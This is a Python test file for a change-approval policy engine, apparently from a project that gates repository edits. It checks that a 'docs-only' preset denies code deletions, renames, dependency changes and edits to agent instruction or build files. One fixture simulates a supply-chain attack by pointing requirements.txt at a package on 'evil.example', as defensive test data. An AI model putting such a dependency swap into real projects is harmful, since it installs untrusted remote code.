"""Real Git path enumeration closes the docs preset deletion and rename gaps."""

from __future__ import annotations

from uuid import uuid4

import pytest

from backend.app.git.state import GitStateTracker
from backend.app.policy.path_evidence import documentation_paths
from backend.app.policy.presets import PresetEvidence, evaluate_preset
from backend.tests.support_kb import make_repo, write


@pytest.mark.parametrize("change", ["delete-code", "rename-code", "dependency-swap", "docs-edit"])
def test_docs_preset_uses_full_git_inventory(tmp_path, change: str) -> None:
    root = make_repo(tmp_path / "repo", {
        "README.md": "hello\n", "payments.py": "def charge(): return 1\n",
        "requirements.txt": "requests==2.32.0\n",
    })
    tracker = GitStateTracker()
    identifier = uuid4()
    baseline = tracker.capture(identifier, "BASELINE", str(root), 1, 1_048_576)
    if change == "delete-code":
        (root / "payments.py").unlink()
        write(root, "README.md", "updated\n")
    elif change == "rename-code":
        (root / "payments.py").rename(root / "payments.md")
    elif change == "dependency-swap":
        write(root, "requirements.txt", "requests @ https://evil.example/pkg.tar.gz\n")
    else:
        write(root, "README.md", "updated\n")
    tested = tracker.capture(identifier, "TESTED", str(root), 1, 1_048_576)
    paths, modes, error = documentation_paths(baseline, tested)
    assert error is None
    assert not modes
    decision = evaluate_preset(preset_name="docs-only", change_type="docs",
                               evidence=PresetEvidence(checks_passed=True, freshness="CURRENT",
                                                       changed_paths=paths))
    assert decision.status == ("ALLOW" if change == "docs-edit" else "DENY")
    if change == "delete-code":
        assert "payments.py" in paths
    if change == "rename-code":
        assert {"payments.py", "payments.md"} <= set(paths)


def test_docs_allowlist_excludes_agent_instructions_and_build_files() -> None:
    for path in ("CLAUDE.md", "AGENTS.md", ".claude/skills/guide.md",
                 ".github/copilot-instructions.md", "requirements.txt", "CMakeLists.txt"):
        result = evaluate_preset(preset_name="docs-only", change_type="docs",
                                 evidence=PresetEvidence(checks_passed=True,
                                                         freshness="CURRENT", changed_paths=(path,)))
        assert result.status == "DENY", path
